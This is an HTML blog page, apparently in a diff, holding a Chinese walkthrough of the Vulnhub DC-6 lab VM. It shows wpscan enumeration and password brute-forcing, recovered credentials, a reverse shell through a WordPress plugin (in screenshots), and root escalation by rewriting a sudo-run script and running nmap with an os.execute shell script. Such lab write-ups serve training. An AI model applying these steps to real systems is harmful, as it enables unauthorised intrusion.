@@ -1,0 +1,343 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Vulnhub靶机DC系列-DC6 | Putdownd’s Blog</title><meta name="keywords" content="Vulnhub"><meta name="author" content="putdown"><meta name="copyright" content="putdown"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="靶场简介 Name: DC: 6 Date release: 26 Apr 2019 Author: DCAU Series: DC  描述DC-6 是另一个特意建造的易受攻击的实验室，旨在获得渗透测试领域的经验。 这不是一个过于困难的挑战，因此对初学者来说应该很棒。 这一挑战的最终目标是获得根并阅读唯一的标志。 必须具备 Linux 技能和熟悉 Linux 命令行，以及一些基本渗透测试工具的经验">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulnhub靶机DC系列-DC6">
+<meta property="og:url" content="https://blog.putdown.top/archives/331d7522.html">
+<meta property="og:site_name" content="Putdownd’s Blog">
+<meta property="og:description" content="靶场简介 Name: DC: 6 Date release: 26 Apr 2019 Author: DCAU Series: DC  描述DC-6 是另一个特意建造的易受攻击的实验室，旨在获得渗透测试领域的经验。 这不是一个过于困难的挑战，因此对初学者来说应该很棒。 这一挑战的最终目标是获得根并阅读唯一的标志。 必须具备 Linux 技能和熟悉 Linux 命令行，以及一些基本渗透测试工具的经验">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.putdown.top/img/e5925563a436d850cfc6184421b9ec77.jpeg">
+<meta property="article:published_time" content="2022-09-12T11:24:26.000Z">
+<meta property="article:modified_time" content="2023-11-17T07:58:13.000Z">
+<meta property="article:author" content="putdown">
+<meta property="article:tag" content="Vulnhub">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.putdown.top/img/e5925563a436d850cfc6184421b9ec77.jpeg"><link rel="shortcut icon" href="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/Snipaste_2022-09-17_18-27-06.png"><link rel="canonical" href="https://blog.putdown.top/archives/331d7522"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="baidu-site-verification" content="code-t8FWZKLQce"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?f755324450eb55ec18bb83a2d2f2334e";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: true,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Vulnhub靶机DC系列-DC6',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-11-17 07:58:13'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/style.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.css" /><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.1.0"><link rel="alternate" href="/atom.xml" title="Putdownd’s Blog" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/Snipaste_2022-09-17_18-27-06.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">115</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">30</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 全部文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/e5925563a436d850cfc6184421b9ec77.jpeg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Putdownd’s Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 全部文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Vulnhub靶机DC系列-DC6</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-09-12T11:24:26.000Z" title="发表于 2022-09-12 11:24:26">2022-09-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-11-17T07:58:13.000Z" title="更新于 2023-11-17 07:58:13">2023-11-17</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Vulnhub靶机DC系列-DC6"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="靶场简介"><a href="#靶场简介" class="headerlink" title="靶场简介"></a>靶场简介</h1><ul>
+<li><strong>Name</strong>: DC: 6</li>
+<li><strong>Date release</strong>: 26 Apr 2019</li>
+<li><strong>Author</strong>: <a target="_blank" rel="noopener external nofollow noreferrer" href="http://www.vulnhub.com/author/dcau,610/">DCAU</a></li>
+<li><strong>Series</strong>: <a target="_blank" rel="noopener external nofollow noreferrer" href="http://www.vulnhub.com/series/dc,199/">DC</a></li>
+</ul>
+<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>DC-6 是另一个特意建造的易受攻击的实验室，旨在获得渗透测试领域的经验。</p>
+<p>这不是一个过于困难的挑战，因此对初学者来说应该很棒。</p>
+<p>这一挑战的最终目标是获得根并阅读唯一的标志。</p>
+<p>必须具备 Linux 技能和熟悉 Linux 命令行，以及一些基本渗透测试工具的经验。</p>
+<p>对于初学者来说，谷歌可以提供很大的帮助，但你可以随时在@DCAU7 上给我发推文，寻求帮助，让你重新开始。但请注意：我不会给你答案，相反，我会给你一个关于如何前进的想法。</p>
+<h2 id="技术信息"><a href="#技术信息" class="headerlink" title="技术信息"></a>技术信息</h2><p>DC-6 是基于 Debian 64 位构建的 VirtualBox VM，但在大多数 PC 上运行它应该没有任何问题。</p>
+<p>我已经在 VMWare Player 上对此进行了测试，但如果在 VMware 中运行此 VM 有任何问题，请通读此内容。</p>
+<p>它当前配置为桥接网络，但是，可以根据您的要求进行更改。网络配置为 DHCP。</p>
+<p>安装很简单 - 下载它，解压缩，然后将它导入 VirtualBox 或 VMWare，然后就可以了。</p>
+<p><strong>注意：您需要在您的渗透测试设备上编辑您的主机文件，以便它读取如下内容：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.0.142 wordy</span><br></pre></td></tr></table></figure>
+
+<p>注意：我以 192.168.0.142 为例。您需要使用常规方法来确定 VM 的 IP 地址，并进行相应调整。</p>
+<p>这个非常重要。</p>
+<p>是的，它是另一个基于 WordPress 的虚拟机（虽然只是我的第二个）。</p>
+<h2 id="重要的"><a href="#重要的" class="headerlink" title="重要的"></a>重要的</h2><p>虽然使用此 VM 应该没有问题，但通过下载它，您将对此 VM 可能造成的任何意外损坏承担全部责任。</p>
+<p>这么说应该没什么问题，但我觉得有必要把它扔在那里以防万一。</p>
+<h2 id="接触"><a href="#接触" class="headerlink" title="接触"></a>接触</h2><p>我也很想听听人们如何解决这些挑战，所以如果你准备写一个演练，请这样做并给我一个链接，或者，在 Twitter 上关注我，然后给我发消息（你可以如果您愿意，请在您给我 DM 后取消关注）。</p>
+<p>可以通过 Twitter 联系我 - @DCAU7</p>
+<h2 id="线索"><a href="#线索" class="headerlink" title="线索"></a>线索</h2><p>好吧，这并不是一个真正的线索，但对于那些只想继续工作的人来说，更多的是一些“我们不想花五年时间等待某个过程完成”的建议。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt 这应该可以为您节省几年时间。;-)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912091433607.png" alt="image-20220912091433607"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali 192.168.169.220</span><br><span class="line">dc-6 192.168.169.232</span><br></pre></td></tr></table></figure>
+
+<h2 id="根据描述修改-host"><a href="#根据描述修改-host" class="headerlink" title="根据描述修改 host"></a>根据描述修改 host</h2><p>格式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.169.232  wordy</span><br></pre></td></tr></table></figure>
+
+<p>kali linux</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912092217947.png" alt="image-20220912092217947"></p>
+<p>windows</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\drivers\etc</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912092114047.png" alt="image-20220912092114047"></p>
+<h2 id="扫描目标ip"><a href="#扫描目标ip" class="headerlink" title="扫描目标ip"></a>扫描目标ip</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912092347729.png" alt="image-20220912092347729"></p>
+<ul>
+<li>ssh 和 http</li>
+<li>访问</li>
+</ul>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912092509308.png" alt="image-20220912092509308"></p>
+<h2 id="开扫"><a href="#开扫" class="headerlink" title="开扫"></a>开扫</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordy/ -e</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>找到用户</li>
+</ul>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912093546822.png" alt="image-20220912093546822"></p>
+<ul>
+<li><p>把这些用户名 user.txt 保存</p>
+</li>
+<li><p>根据上面的线索,作者给出爆破的字典</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912093909278.png" alt="image-20220912093909278"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912094432887.png" alt="image-20220912094432887"></p>
+<ul>
+<li>在rockyou.txt中查找包含k01的字符串，并写入文件passwords.txt</li>
+</ul>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912094545093.png" alt="image-20220912094545093"></p>
+<h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://wordy -U user.txt -P passwords.txt  </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912095337051.png" alt="image-20220912095337051"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Username: mark</span><br><span class="line">Password: helpdesk01</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>登录后台</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://wordy/wp-login.php?</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912095507386.png" alt="image-20220912095507386"></p>
+<ul>
+<li>找到一个 输入框 可以执行命令,需要修改一下长度限制</li>
+</ul>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912100136064.png" alt="image-20220912100136064"></p>
+<ul>
+<li>搜索可以利用的漏洞</li>
+</ul>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912102402561.png" alt="image-20220912102402561"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912102548488.png" alt="image-20220912102548488"></p>
+<ul>
+<li>运行脚本 根据提示 填入相应的信息</li>
+</ul>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912102748313.png" alt="image-20220912102748313"></p>
+<ul>
+<li>交互式shell 直接停止运行 放弃</li>
+</ul>
+<h2 id="另一个脚本"><a href="#另一个脚本" class="headerlink" title="另一个脚本"></a>另一个脚本</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912104612782.png" alt="image-20220912104612782"></p>
+<ul>
+<li>修改文件</li>
+</ul>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912104815778.png" alt="image-20220912104815778"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912105046646.png" alt="image-20220912105046646"></p>
+<ul>
+<li>保存打开并且监听端口</li>
+</ul>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912105337056.png" alt="image-20220912105337056"></p>
+<ul>
+<li>监听成功</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912105437350.png" alt="image-20220912105437350"></p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912105613153.png" alt="image-20220912105613153"></p>
+<ul>
+<li>找到</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">graham </span><br><span class="line">GSo7isUM1D4</span><br></pre></td></tr></table></figure>
+
+<h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912105912287.png" alt="image-20220912105912287"></p>
+<ul>
+<li>ssh 登陆成功</li>
+</ul>
+<h2 id="查看权限"><a href="#查看权限" class="headerlink" title="查看权限"></a>查看权限</h2><p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912110019034.png" alt="image-20220912110019034"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912110253508.png" alt="image-20220912110253508"></p>
+<ul>
+<li><p>graham用户可以修改&#x2F;home&#x2F;jens&#x2F;backups.sh文件。</p>
+</li>
+<li><p>用echo命令改写&#x2F;home&#x2F;jens&#x2F;backups.sh的内容</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;/bin/bash&quot; &gt; backups.sh</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>用jens的身份执行，得到jens的shell</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u jens /home/jens/backups.sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912110526604.png" alt="image-20220912110526604"></p>
+<ul>
+<li>查看jens可以sudo执行的命令，发现其可以以root的身份执行nmap命令</li>
+</ul>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912110602968.png" alt="image-20220912110602968"></p>
+<hr>
+<ul>
+<li>找可以利用的 (没成功)</li>
+</ul>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912111352884.png" alt="image-20220912111352884"></p>
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912111532605.png" alt="image-20220912111532605"></p>
+<hr>
+<ul>
+<li>另一种方法</li>
+</ul>
+<p>nmap工具是可以执行脚本的，那么我们把弹root用户shell的命令写入到nmap的脚本里面，然后用nmap命令执行即可切换到root用户的shell。命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; getShell</span><br><span class="line">sudo  nmap  --script=getShell</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gh.putdown.top/https://raw.githubusercontent.com/futalk/tuchuang/main/img/image-20220912112254947.png" alt="image-20220912112254947"></p>
+<h1 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h1></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://blog.putdown.top">putdown</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://blog.putdown.top/archives/331d7522.html">https://blog.putdown.top/archives/331d7522.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.putdown.top" target="_blank">Putdownd’s Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Vulnhub/">Vulnhub</a></div><div class="post_share"><div class="social-share" data-image="/img/e5925563a436d850cfc6184421b9ec77.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/archives/441a45b4.html"><img class="prev-cover" src="/img/e5925563a436d850cfc6184421b9ec77.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Vulnhub靶机DC系列-DC7</div></div></a></div><div class="next-post pull-right"><a href="/archives/aa142498.html"><img class="next-cover" src="/img/e5925563a436d850cfc6184421b9ec77.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Vulnhub靶机DC系列-DC5</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/archives/51ba13e9.html" title="Vulnhub-Breakout"><img class="cover" src="/img/e5925563a436d850cfc6184421b9ec77.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-11</div><div class="title">Vulnhub-Breakout</div></div></a></div><div><a href="/archives/520642ee.html" title="Vulnhub-CORROSION: 1"><img class="cover" src="/img/e5925563a436d850cfc6184421b9ec77.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-03</div><div class="title">Vulnhub-CORROSION: 1</div></div></a></div><div><a href="/archives/cb0f1354.html" title="Vulnhub-CORROSION: 2"><img class="cover" src="/img/e5925563a436d850cfc6184421b9ec77.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-04</div><div class="title">Vulnhub-CORROSION: 2</div></div></a></div><div><a href="/archives/aa472e4b.html" title="Vulnhub-DARKHOLE: 1"><img class="cover" src="/img/e5925563a436d850cfc6184421b9ec77.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-01</div><div class="title">Vulnhub-DARKHOLE: 1</div></div></a></div><div><a href="/archives/b060e4aa.html" title="Vulnhub-HA: WORDY"><img class="cover" src="/img/e5925563a436d850cfc6184421b9ec77.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-05</div><div class="title">Vulnhub-HA: WORDY</div></div></a></div><div><a href="/archives/6be15d5.html" title="Vulnhub-HACKATHONCTF: 1"><img class="cover" src="/img/e5925563a436d850cfc6184421b9ec77.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-28</div><div class="title">Vulnhub-HACKATHONCTF: 1</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E7%AE%80%E4%BB%8B"><span class="toc-text">靶场简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%8F%E8%BF%B0"><span class="toc-text">描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%80%E6%9C%AF%E4%BF%A1%E6%81%AF"><span class="toc-text">技术信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%87%8D%E8%A6%81%E7%9A%84"><span class="toc-text">重要的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A5%E8%A7%A6"><span class="toc-text">接触</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BA%BF%E7%B4%A2"><span class="toc-text">线索</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-text">基本信息</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AE%E6%8F%8F%E8%BF%B0%E4%BF%AE%E6%94%B9-host"><span class="toc-text">根据描述修改 host</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E7%9B%AE%E6%A0%87ip"><span class="toc-text">扫描目标ip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%80%E6%89%AB"><span class="toc-text">开扫</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%86%E7%A0%B4"><span class="toc-text">爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%A6%E4%B8%80%E4%B8%AA%E8%84%9A%E6%9C%AC"><span class="toc-text">另一个脚本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh"><span class="toc-text">ssh</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%9D%83%E9%99%90"><span class="toc-text">查看权限</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%93%E6%9D%9F"><span class="toc-text">结束</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-image: 